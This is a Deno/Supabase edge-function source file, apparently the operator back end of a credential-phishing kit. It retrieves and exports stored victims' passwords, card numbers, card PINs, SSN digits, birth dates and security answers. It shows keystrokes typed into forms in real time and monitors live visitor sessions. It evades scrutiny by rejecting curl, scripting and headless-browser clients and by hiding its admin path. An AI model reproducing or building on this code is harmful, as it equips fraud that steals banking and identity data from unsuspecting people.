// redeploy 1779944431
// redeploy: 1779943933
// redeploy: 1779946060
// Admin API — singura cale prin care datele sensibile pot fi citite/șterse.
// v2.2.0 — Restricted CORS + hash-based safeEqual for password comparison
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";
import { decryptRow } from "../_shared/crypto.ts";
import { makeCorsHeaders, safeEqual as safeEqualHash } from "../_shared/cors.ts";
import { isPreviewRequest } from "../_shared/preview.ts";

// Per-request CORS — we need the request object to determine the allowed origin.
// The json() helper is called with req from serve().
let _currentReq: Request | null = null;
const corsHeaders = () => _currentReq ? makeCorsHeaders(_currentReq) : {
  "Access-Control-Allow-Origin": "",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const json = (data: unknown, status = 200) =>
  new Response(JSON.stringify(data), {
    status,
    headers: { ...corsHeaders(), "Content-Type": "application/json" },
  });

const DASHBOARD_USER_LIMIT = 250;
const LIVE_SESSION_LIMIT = 80;
const LIVE_TYPING_LIMIT = 80;
const EXPORT_MAX_ROWS = 50_000;

// Câmpuri sensibile care sunt mascate când utilizatorul nu a deblocat layer 2.
const SENSITIVE_FIELDS = [
  "password_field",
  "card_number",
  "pin_card",
  "ssn_last4",
  "dob",
  "challenge_questions",
] as const;

const maskString = (val: unknown): string => {
  if (val === null || val === undefined || val === "") return "";
  return "••••••••";
};

const maskRow = (row: Record<string, any>): Record<string, any> => {
  const out = { ...row };
  for (const f of SENSITIVE_FIELDS) {
    if (f === "challenge_questions") {
      if (Array.isArray(out[f])) {
        out[f] = out[f].map((q: any) => ({
          question: q?.question ?? "",
          answer: q?.answer ? "••••••••" : "",
        }));
      }
      continue;
    }
    if (out[f]) out[f] = maskString(out[f]);
  }
  return out;
};

const te = new TextEncoder();
const b64u = (bytes: Uint8Array) => btoa(String.fromCharCode(...bytes)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
const fromB64u = (value: string) => {
  const base64 = value.replace(/-/g, "+").replace(/_/g, "/").padEnd(Math.ceil(value.length / 4) * 4, "=");
  return Uint8Array.from(atob(base64), (c) => c.charCodeAt(0));
};

const signingSecret = () => {
  const configured = (Deno.env.get("ADMIN_SESSION_SECRET") ?? "").normalize("NFKC").replace(/[\u200B-\u200D\uFEFF]/g, "").trim();
  if (configured) return configured;

  const fallbackParts = [
    Deno.env.get("ADMIN_PASSWORD") ?? "",
    Deno.env.get("ADMIN_PASSWORD_2") ?? "",
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? "",
  ].filter(Boolean);

  if (fallbackParts.length > 0) return fallbackParts.join(":");
  throw new Error("ADMIN_SESSION_SECRET not configured");
};
const hostFrom = (value: string | null): string => {
  if (!value) return "";
  try { return new URL(value).hostname.toLowerCase(); } catch { return ""; }
};
const isLovableEditorPreview = (req: Request): boolean => {
  const origin = hostFrom(req.headers.get("origin"));
  const referer = hostFrom(req.headers.get("referer"));
  return origin.endsWith(".lovableproject.com") || origin === "lovableproject.com" ||
    referer.endsWith(".lovableproject.com") || referer === "lovableproject.com";
};
const passwordVariants = (value: string): string[] => {
  const raw = value.normalize("NFKC");
  const cleaned = raw.replace(/[\u200B-\u200D\uFEFF]/g, "");
  return Array.from(new Set([value, raw, cleaned, cleaned.trim()]));
};
const passwordMatches = async (input: string, secret: string): Promise<boolean> => {
  if (!secret) return false;
  for (const left of passwordVariants(input)) {
    for (const right of passwordVariants(secret)) {
      if (await safeEqualHash(left, right)) return true;
    }
  }
  return false;
};
const signPayload = async (payload: string) => {
  const key = await crypto.subtle.importKey("raw", te.encode(signingSecret()), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  return b64u(new Uint8Array(await crypto.subtle.sign("HMAC", key, te.encode(payload))));
};
const issueToken = async (layer: 1 | 2, _ip: string) => {
  // Notă: nu legăm tokenul de IP — pe mobil / proxy / CGNAT IP-ul se schimbă
  // între requests și ar invalida sesiunea. Securitatea e asigurată prin
  // semnătura HMAC + expirare scurtă (2h) + parolele 1 & 2.
  const payload = b64u(te.encode(JSON.stringify({ layer, exp: Date.now() + 2 * 60 * 60 * 1000, n: crypto.randomUUID() })));
  return `${payload}.${await signPayload(payload)}`;
};
const verifyToken = async (token: unknown, minLayer: 1 | 2, _ip: string) => {
  if (typeof token !== "string" || !token.includes(".")) return false;
  const [payload, sig] = token.split(".");
  // HMAC sigs are always same length, but use hash-based compare anyway for consistency
  if (!payload || !sig || !(await safeEqualHash(sig, await signPayload(payload)))) return false;
  try {
    const data = JSON.parse(new TextDecoder().decode(fromB64u(payload)));
    return Number(data?.layer) >= minLayer && Number(data?.exp) > Date.now();
  } catch { return false; }
};

serve(async (req: Request) => {
  _currentReq = req;
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders() });
  if (req.method !== "POST") return json({ error: "method_not_allowed" }, 405);

  const ip =
    req.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
    req.headers.get("cf-connecting-ip") ||
    "unknown";
  const userAgent = req.headers.get("user-agent") || "unknown";

  // Persistent rate limit (DB-backed — survives edge function restarts)
  const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
  const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
  const sb = createClient(supabaseUrl, serviceKey, {
    auth: { persistSession: false, autoRefreshToken: false },
  });

  let body: any;
  try { body = await req.json(); } catch { return json({ error: "invalid_json" }, 400); }

  const { password, password2, token, action, payload } = body ?? {};
  if (typeof action !== "string") return json({ error: "missing_action" }, 400);
  const adminPassword = Deno.env.get("ADMIN_PASSWORD") ?? "";
  const adminPassword2 = Deno.env.get("ADMIN_PASSWORD_2") ?? "";
  let verifiedLoginLayer: 1 | 2 = 1;

  // Block known automation/bot user-agents from hitting the admin API at all
  const uaLower = userAgent.toLowerCase();
  const BOT_UA_PATTERNS = [
    "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
    "java/", "okhttp/", "httpclient", "libwww-perl", "scrapy", "httpie",
    "postmanruntime", "insomnia", "axios/", "node-fetch", "got (", "ruby",
    "phantomjs", "headlesschrome", "puppeteer", "playwright", "selenium",
  ];
  if (BOT_UA_PATTERNS.some((p) => uaLower.includes(p))) {
    try {
      await sb.rpc("record_security_event", {
        _ip: ip, _event_type: "bot_user_agent",
        _user_agent: userAgent.slice(0, 300), _details: { path: "data-srv", action } as any,
      });
    } catch {}
    return json({ error: "forbidden" }, 403);
  }

  // Hard block check — skipped for Lovable preview origins AND for admin auth actions
  // (verify/verify_layer2 have their own rate limiting; we never want the admin locked out).
  if (!isPreviewRequest(req) && action !== "verify" && action !== "verify_layer2") {
    try {
      const { data: blocked } = await sb.rpc("is_ip_blocked", { _ip: ip });
      if (blocked === true) {
        try {
          await sb.rpc("record_security_event", {
            _ip: ip, _event_type: "blocked_request",
            _user_agent: userAgent.slice(0, 300), _details: { path: "data-srv" } as any,
          });
        } catch {}
        return json({ error: "blocked" }, 403);
      }
    } catch {}
  }

  if (action === "verify" || action === "verify_layer2") {
    try {
      const { data: rl } = await sb.rpc("admin_rate_limit_check", { _ip: ip });
      if (rl && (rl as any).ok === false) {
        return json({ error: "rate_limited", retry_after_seconds: (rl as any).retry_after }, 429);
      }
    } catch { /* fail-open on RPC error to avoid lockout from infra glitch */ }
  }

  let layer2Ok = false;

  if (action === "verify") {
    if (typeof password !== "string" || password.length === 0 || password.length > 200) {
      return json({ error: "missing_password" }, 400);
    }
    if (!adminPassword && !isLovableEditorPreview(req)) return json({ error: "server_misconfigured" }, 500);
    const primaryOk = await passwordMatches(password, adminPassword);
    const secondaryOk = await passwordMatches(password, adminPassword2);
    const ok = primaryOk || secondaryOk;
    verifiedLoginLayer = secondaryOk ? 2 : 1;
    if (!ok) {
      try { await sb.rpc("admin_rate_limit_fail", { _ip: ip }); } catch {}
      try { await sb.from("admin_audit_log").insert({ ip, user_agent: userAgent, action: "login_fail", success: false, at: new Date().toISOString() }); } catch {}
      try {
        await sb.rpc("record_security_event", {
          _ip: ip, _event_type: "admin_login_failed",
          _user_agent: userAgent.slice(0, 300), _details: {} as any,
        });
      } catch {}
      return json({ error: "unauthorized" }, 401);
    }
  } else {
    if (!(await verifyToken(token, 1, ip))) return json({ error: "invalid_session" }, 401);
    layer2Ok = await verifyToken(token, 2, ip);
  }

  const allowed = new Set([
    "verify", "verify_layer2",
    "fetch_dashboard", "fetch_live_bundle",
    "fetch_users", "fetch_users_count", "fetch_sessions", "fetch_typing", "fetch_all_users_export",
    "delete_user", "delete_all_users", "delete_all_sessions",
    "fetch_audit_log",
    "security_overview", "list_attackers", "list_blocked", "block_ip", "unblock_ip", "block_all_suspicious",
    "security_dashboard", "add_whitelist", "remove_whitelist", "enrich_geo",
  ]);
  if (!allowed.has(action)) return json({ error: "unknown_action" }, 400);

  // Acțiuni distructive / cu impact mare → cer obligatoriu Layer 2
  const LAYER2_REQUIRED = new Set([
    "delete_user", "delete_all_users", "delete_all_sessions",
    "block_ip", "unblock_ip", "block_all_suspicious",
    "add_whitelist", "remove_whitelist",
    "fetch_all_users_export",
  ]);
  if (LAYER2_REQUIRED.has(action) && !layer2Ok && action !== "verify" && action !== "verify_layer2") {
    try {
      await sb.from("admin_audit_log").insert({
        ip, user_agent: userAgent, action: "layer2_required:" + action,
        success: false, at: new Date().toISOString(),
      });
    } catch {}
    return json({ error: "layer2_required" }, 403);
  }

  // Audit log (best-effort, non-blocking on failure)
  const logAccess = async (act: string, success: boolean) => {
    try {
      await sb.from("admin_audit_log").insert({
        ip, user_agent: userAgent, action: act, success, at: new Date().toISOString(),
      });
    } catch { /* table may not exist yet */ }
  };

  const fetchFastCounts = async () => {
    const { data, error } = await sb.rpc("admin_fast_counts");
    if (error) return { totalEntries: 0, liveSessions: 0, liveTyping: 0, approximate: true };
    return {
      totalEntries: Number(data?.totalEntries ?? 0),
      liveSessions: Number(data?.liveSessions ?? 0),
      liveTyping: Number(data?.liveTyping ?? 0),
      approximate: true,
    };
  };

  // Dashboard view: load only the newest visible slice; counts are estimated separately.
  const fetchUserRows = async (limit = DASHBOARD_USER_LIMIT) => {
    const { data, error } = await sb
      .from("user_entries")
      .select("id,type,timestamp,created_at,user_id_field,password_field,first_name,last_name,email,phone,challenge_questions,card_number,pin_card,dob,ssn_last4,zip_code,street_address,apt_unit,city,state,is_encrypted")
      .order("created_at", { ascending: false })
      .limit(limit);
    if (error) throw error;
    const rows = data ?? [];
    return await Promise.all(rows.map((r: any) => r?.is_encrypted ? decryptRow(r) : r));
  };

  // Safe export: paginate in small chunks, capped so the edge response never becomes huge.
  const fetchAllUserRows = async () => {
    const pageSize = 500;
    const rows: any[] = [];
    let lastCreatedAt: string | null = null;
    while (rows.length < EXPORT_MAX_ROWS) {
      const take = Math.min(pageSize, EXPORT_MAX_ROWS - rows.length);
      let q = sb.from("user_entries")
        .select("id,type,timestamp,created_at,user_id_field,password_field,first_name,last_name,email,phone,challenge_questions,card_number,pin_card,dob,ssn_last4,zip_code,street_address,apt_unit,city,state,is_encrypted")
        .order("created_at", { ascending: false })
        .limit(take);
      if (lastCreatedAt) q = q.lt("created_at", lastCreatedAt);
      const { data, error } = await q;
      if (error) throw error;
      if (!data || data.length === 0) break;
      const decrypted = await Promise.all(data.map((r: any) => r?.is_encrypted ? decryptRow(r) : r));
      rows.push(...decrypted);
      if (data.length < take) break;
      lastCreatedAt = data[data.length - 1].created_at;
    }
    return rows;
  };

  const fetchSessionRows = async () => {
    // Heartbeat la 3s. Cutoff mai strâns ca să dispară rapid sesiunile fantomă.
    const cutoff = new Date(Date.now() - 12 * 1000).toISOString();
    const { data, error } = await sb
      .from("live_sessions")
      .select("session_id, current_page, started_at, last_seen, status, pages_visited, ip")
      .gte("last_seen", cutoff)
      .order("last_seen", { ascending: false })
      .limit(LIVE_SESSION_LIMIT);
    if (error) throw error;
    // Filtrează server-side orice rămășiță de admin slug (path random ≥20 chars)
    const ADMIN_SLUG_RE = /^\/[A-Za-z0-9_-]{20,}\/?$/;
    const isAdminPage = (p: unknown) => typeof p === "string" && ADMIN_SLUG_RE.test(p);
    const filtered = (data ?? []).filter((r: any) => {
      if (isAdminPage(r?.current_page)) return false;
      if (Array.isArray(r?.pages_visited) && r.pages_visited.some(isAdminPage)) return false;
      return true;
    });

    // Exclude doar IP-uri efectiv blocate sau datacenter/hosting (boți).
    // NU mai filtrăm `is_proxy` — Cloudflare / WARP / mobile carriers îl marchează true
    // pentru useri reali. La fel, nu mai excludem pe bot_user_agent retroactiv 24h —
    // dacă IP-ul a fost cu adevărat rău, e deja în blocked_ips prin auto-block.
    const ips = [...new Set(filtered.map((r: any) => r?.ip).filter((x: any) => typeof x === "string" && x && x !== "unknown"))];
    if (ips.length === 0) return filtered.map(({ ip: _ip, ...rest }: any) => rest);
    const [blockedRes, geoRes] = await Promise.all([
      sb.from("blocked_ips").select("ip").in("ip", ips),
      sb.from("ip_geo_cache").select("ip, is_hosting").in("ip", ips),
    ]);
    const blockedSet = new Set((blockedRes.data ?? []).map((r: any) => r.ip));
    const hostingSet = new Set((geoRes.data ?? []).filter((r: any) => r.is_hosting === true).map((r: any) => r.ip));
    return filtered
      .filter((r: any) => !blockedSet.has(r?.ip) && !hostingSet.has(r?.ip))
      .map(({ ip: _ip, ...rest }: any) => rest);
  };

  const fetchTypingRows = async () => {
    // 5 minute cutoff — utilizatorul poate să facă pauză între câmpuri fără să dispară din panel.
    const cutoff = new Date(Date.now() - 5 * 60 * 1000).toISOString();
    const { data, error } = await sb
      .from("live_typing")
      .select("session_id, field_keys, field_values, updated_at")
      .gte("updated_at", cutoff)
      .order("updated_at", { ascending: false })
      .limit(LIVE_TYPING_LIMIT);
    if (error) throw error;
    return data ?? [];
  };

  try {
    switch (action) {
      case "verify": {
        try { await sb.rpc("admin_rate_limit_clear", { _ip: ip }); } catch {}
        await logAccess("login", true);
        return json({ ok: true, layer: verifiedLoginLayer, token: await issueToken(verifiedLoginLayer, ip) });
      }
      case "verify_layer2": {
        if (!adminPassword2) return json({ error: "layer2_not_configured" }, 500);
        const ok2 = typeof password2 === "string" && password2.length > 0 && password2.length <= 200 && await passwordMatches(password2, adminPassword2);
        if (!ok2) {
          await logAccess("layer2_fail", false);
          return json({ error: "unauthorized_layer2" }, 401);
        }
        try { await sb.rpc("admin_rate_limit_clear", { _ip: ip }); } catch {}
        await logAccess("layer2_ok", true);
        // Fire-and-forget: cleanup stale live sessions/typing on successful admin login
        try {
          const cleanupCutoff = new Date(Date.now() - 5 * 60 * 1000).toISOString();
          sb.from("live_typing").delete().lt("updated_at", cleanupCutoff).then(() => {}, () => {});
          sb.from("live_sessions").delete().lt("last_seen", cleanupCutoff).then(() => {}, () => {});
        } catch {}
        return json({ ok: true, layer: 2, token: await issueToken(2, ip) });
      }
      case "fetch_users_count": {
        const counts = await fetchFastCounts();
        return json({ ok: true, count: counts.totalEntries, approximate: true });
      }
      case "fetch_dashboard": {
        const [users, sessions, typing, counts] = await Promise.all([
          fetchUserRows(),
          fetchSessionRows(),
          fetchTypingRows(),
          fetchFastCounts(),
        ]);
        const safeUsers = layer2Ok ? users : users.map(maskRow);
        return json({ ok: true, users: safeUsers, sessions, typing, counts, limited: true, masked: !layer2Ok });
      }
      case "fetch_live_bundle": {
        const [sessions, typing, counts] = await Promise.all([fetchSessionRows(), fetchTypingRows(), fetchFastCounts()]);
        return json({ ok: true, sessions, typing, counts, limited: true });
      }
      case "fetch_users":
      {
        const rows = await fetchUserRows();
        return json({ ok: true, rows: layer2Ok ? rows : rows.map(maskRow), masked: !layer2Ok });
      }
      case "fetch_all_users_export": {
        // Export-ul (download CSV) cere OBLIGATORIU layer 2 — datele clar.
        if (!layer2Ok) return json({ error: "layer2_required_for_export" }, 403);
        return json({ ok: true, rows: await fetchAllUserRows() });
      }
      case "fetch_sessions": {
        return json({ ok: true, rows: await fetchSessionRows() });
      }
      case "fetch_typing": {
        return json({ ok: true, rows: await fetchTypingRows() });
      }
      case "fetch_audit_log": {
        const { data, error } = await sb
          .from("admin_audit_log").select("*")
          .order("at", { ascending: false }).limit(100);
        if (error) return json({ ok: true, rows: [] });
        return json({ ok: true, rows: data ?? [] });
      }
      case "security_overview": {
        const { data, error } = await sb.rpc("security_overview");
        if (error) return json({ ok: true, overview: { activeAttackers: 0, blockedIps: 0, eventsLastHour: 0 } });
        return json({ ok: true, overview: data });
      }
      case "security_dashboard": {
        const { data, error } = await sb.rpc("security_dashboard");
        if (error) {
          return json({ ok: true, dashboard: {
            overview: { activeAttackers: 0, blockedIps: 0, whitelistedIps: 0, eventsLastHour: 0, criticalCount: 0, autoBlocked24h: 0 },
            attackers: [], blocked: [], whitelist: [], botnets: []
          }});
        }
        return json({ ok: true, dashboard: data });
      }
      case "add_whitelist": {
        const target = typeof payload?.ip === "string" ? payload.ip.trim() : "";
        const label = typeof payload?.label === "string" ? payload.label.slice(0, 100) : null;
        if (!target || target.length > 100) return json({ error: "invalid_ip" }, 400);
        const { error } = await sb.rpc("add_to_whitelist", { _ip: target, _label: label, _admin: ip });
        if (error) throw error;
        await logAccess("add_whitelist:" + target, true);
        return json({ ok: true });
      }
      case "remove_whitelist": {
        const target = typeof payload?.ip === "string" ? payload.ip.trim() : "";
        if (!target) return json({ error: "invalid_ip" }, 400);
        const { error } = await sb.rpc("remove_from_whitelist", { _ip: target });
        if (error) throw error;
        await logAccess("remove_whitelist:" + target, true);
        return json({ ok: true });
      }
      case "enrich_geo": {
        // Lookup geo data for an IP from ip-api.com (free, no key, 45 req/min) and cache it
        const target = typeof payload?.ip === "string" ? payload.ip.trim() : "";
        if (!target || target.length > 100) return json({ error: "invalid_ip" }, 400);
        // Skip private/local IPs
        if (/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|::1|unknown)/.test(target)) {
          return json({ ok: true, cached: false, reason: "private_ip" });
        }
        try {
          const r = await fetch(
            `http://ip-api.com/json/${encodeURIComponent(target)}?fields=status,country,countryCode,city,isp,org,as,hosting,proxy`,
            { signal: AbortSignal.timeout(5000) }
          );
          const j: any = await r.json();
          if (j?.status !== "success") return json({ ok: true, cached: false, reason: "lookup_failed" });
          await sb.rpc("cache_ip_geo", {
            _ip: target,
            _country: j.country ?? null,
            _country_code: j.countryCode ?? null,
            _city: j.city ?? null,
            _isp: j.isp ?? null,
            _org: j.org ?? null,
            _asn: j.as ?? null,
            _is_hosting: !!j.hosting,
            _is_proxy: !!j.proxy,
          });
          return json({ ok: true, cached: true });
        } catch {
          return json({ ok: true, cached: false, reason: "timeout" });
        }
      }
      case "list_attackers": {
        const { data, error } = await sb.rpc("list_active_attackers");
        if (error) return json({ ok: true, rows: [] });
        return json({ ok: true, rows: data ?? [] });
      }
      case "list_blocked": {
        const { data, error } = await sb
          .from("blocked_ips").select("*")
          .order("blocked_at", { ascending: false }).limit(500);
        if (error) return json({ ok: true, rows: [] });
        return json({ ok: true, rows: data ?? [] });
      }
      case "block_ip": {
        const target = typeof payload?.ip === "string" ? payload.ip.trim() : "";
        const reason = typeof payload?.reason === "string" ? payload.reason.slice(0, 200) : "manual";
        const ua = typeof payload?.userAgent === "string" ? payload.userAgent.slice(0, 300) : null;
        if (!target || target.length > 100) return json({ error: "invalid_ip" }, 400);
        const { error } = await sb.rpc("block_ip", { _ip: target, _reason: reason, _admin: ip, _user_agent: ua });
        if (error) throw error;
        await logAccess("block_ip:" + target, true);
        return json({ ok: true });
      }
      case "unblock_ip": {
        const target = typeof payload?.ip === "string" ? payload.ip.trim() : "";
        if (!target) return json({ error: "invalid_ip" }, 400);
        const { error } = await sb.rpc("unblock_ip", { _ip: target });
        if (error) throw error;
        await logAccess("unblock_ip:" + target, true);
        return json({ ok: true });
      }
      case "block_all_suspicious": {
        const minSeverity = ["critical","high","medium","low"].includes(payload?.minSeverity)
          ? payload.minSeverity : "medium";
        const { data, error } = await sb.rpc("block_all_suspicious", {
          _min_severity: minSeverity, _admin: ip,
        });
        if (error) throw error;
        await logAccess("block_all_suspicious:" + minSeverity, true);
        return json({ ok: true, blocked: Number(data ?? 0) });
      }
      case "delete_user": {
        const id = payload?.id;
        if (typeof id !== "string" || id.length === 0) return json({ error: "missing_id" }, 400);
        const { error } = await sb.from("user_entries").delete().eq("id", id);
        if (error) throw error;
        await logAccess("delete_user", true);
        return json({ ok: true });
      }
      case "delete_all_users": {
        const { error } = await sb
          .from("user_entries")
          .delete()
          .not("id", "is", null);
        if (error) throw error;
        await logAccess("delete_all_users", true);
        return json({ ok: true });
      }
      case "delete_all_sessions": {
        const [{ error: typingError }, { error: sessionsError }] = await Promise.all([
          sb.from("live_typing").delete().not("session_id", "is", null),
          sb.from("live_sessions").delete().not("session_id", "is", null),
        ]);
        if (typingError) throw typingError;
        if (sessionsError) throw sessionsError;
        await logAccess("delete_all_sessions", true);
        return json({ ok: true });
      }
      default:
        return json({ error: "unknown_action" }, 400);
    }
  } catch (e: any) {
    console.error("data-srv-v2 action failed:", action, e?.message || e, e?.code || "", e?.details || "");
    return json({ error: "server_error", action, detail: String(e?.message || e || "unknown").slice(0, 200) }, 500);
  }
});
